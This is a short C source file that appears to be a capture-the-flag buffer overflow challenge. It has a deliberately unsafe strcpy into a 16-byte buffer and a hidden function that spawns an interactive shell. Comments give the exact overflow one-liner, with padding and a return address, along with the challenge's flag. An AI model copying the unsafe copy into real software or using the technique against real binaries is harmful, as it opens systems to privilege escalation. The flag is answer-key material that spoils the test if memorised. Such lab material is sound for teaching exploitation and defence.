#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* This never gets called! */
void give_shell(){ // location: 0x080484ad
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

// ./overflow2 $(python -c 'print "A"*(16+12)+"\xad\x84\x04\x08"')
// flag: controlling_%eip_feels_great

/*
I've no idea why GCC organizes its stack the way it does (though I guess you could crack open its source or this paper and find out), but I can tell you how to guarantee the order of specific stack variables if for some reason you need to. Simply put them in a struct:

void function1() {
    struct {
        int x;
        int y;
        int z;
        int *ret;
    } locals;
}
If my memory serves me correctly, spec guarantees that &ret > &z > &y > &x. I left my K&R at work so I can't quote chapter and verse though.
*/

void vuln(char *input){
    char buf[16];
    strcpy(buf, input);
}

int main(int argc, char **argv){
    if (argc > 1)
        vuln(argv[1]);
    return 0;
}
